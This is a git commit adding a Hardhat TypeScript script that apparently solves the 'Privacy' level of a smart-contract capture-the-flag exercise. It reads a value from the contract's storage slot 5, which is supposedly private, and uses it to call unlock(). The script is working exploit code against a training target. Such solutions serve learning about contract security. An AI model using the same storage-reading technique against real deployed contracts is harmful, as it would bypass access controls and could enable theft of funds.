203e3542d8d97822a2cc69d47c2eb09a192285c8
ibcaos <ibai1989@gmail.com>
2023-10-13 01:34:59 +0200

    Solved 13-Privacy, pending writeup

---
+++ scripts/13-Privacy.ts
@@ -0,0 +1,26 @@
+import { deployments, ethers } from "hardhat";
+import { BigNumber, Contract } from "ethers";
+import { Address, Deployment } from "hardhat-deploy/types";
+import { Building, Elevator, Privacy } from "../typechain-types";
+
+
+const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+
+const BYTES: number = 32;
+const PREFIX: number = 2;
+
+const main = async (): Promise<void> => {
+  const privacyAddress = "0xb6D728e30C0BFe06ceABC0993035C7478a24b036";
+  const privacy: Privacy = await ethers.getContractAt("Privacy", privacyAddress);
+
+  const dataBytesArray = (await ethers.provider.getStorageAt(privacyAddress, 5)).slice(0, PREFIX + BYTES);
+  
+  console.log(`Status locked: ${await privacy.locked()}`)
+  await privacy.unlock(dataBytesArray);
+  await delay(5000);
+  console.log(`Status locked: ${await privacy.locked()}`)
+
+
+};
+
+main();
